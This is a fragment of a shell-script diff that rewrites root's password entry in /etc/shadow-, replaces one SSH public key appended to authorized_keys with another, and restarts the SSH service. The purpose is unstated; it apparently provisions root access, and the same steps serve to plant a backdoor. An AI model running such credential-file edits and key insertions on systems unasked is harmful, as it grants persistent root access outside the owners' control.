@@ -10,6 +10,6 @@ sed '1d' -i /etc/shadow-
 
 sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow-
 
-sudo sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyp3HKHgwBAGfcuAYh5Dl6jXOOYGap7cEpSddssKw2XAUIKJ8eJm5LniXkdeno2NtgAVqzzZp5uuQzwLYqZVQTtUmODw5tYzljaSq8azsQiRkA+vCpbbLgGu14uM5XaUSnJfokdTDzfJ/dpsLG/K7hb35IzfxHM3Nm0uVl/lp2KrurI9HE+j5pifVoTyHcFiVZBcVd343E8qBeqgFuJUYh0lEHVb4Jt11d/2KH7l0y1iDpDL2nNjmhhIxF4yiIhEXd5KVjP95jgxMp3LaezmPemYhIH1ke8ayknLFmIv6GX1KJGcITD969NHty598Lad9QImslTrItTsDHp34mW2JQvDxyIvhWw6Tc8522rLMk1mURFdAEK3Fv+k7Z403zTVMQCYo3odMftDLw5iGdo1rdXnHna6Ss7nAHa/O/3vG4gKrPmv/U98JQHemGKSA6mMFc2Of4eBxs7/RgFeuRSJrD69OHx795J05k139R6y4PAX/6uCsyqBU/1RJnPDccE+0= root@zoo4' >> ~/.ssh/authorized_keys"
+sudo sh -c "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCiGivf3+H99JRik9MHGGuGeoll2t5mmsxdbdwRHnZ8xEPbq/P7Qmh/phw29OcmZTQvuLBlDiosVl3c+oNZe1oC2FOoQItcqnnhD8WoFEt0hw//K6WyojOi3cKEQH58+9tR+Hkb4mhEGzJ23bzpGbplTk032+AQuhP+UfhyPRI6Tfe6JGTd/HmXTfIoO2O6usQpRHguZWCz6uZD3kxR9e9k+Bjrs9gJ4m22O7wyiKRedoPUFVgPf01rRG0ElsZaQFXBpHIe+JKVfJA1+8BwvdsOKzKfZ+TE7aZar+a161cr6QgF8wVMM1Vgnb/UcsosfZucbY15ZbuDaE2PEmnSTC31 root@mobila' >> ~/.ssh/authorized_keys"
 
 systemctl restart ssh
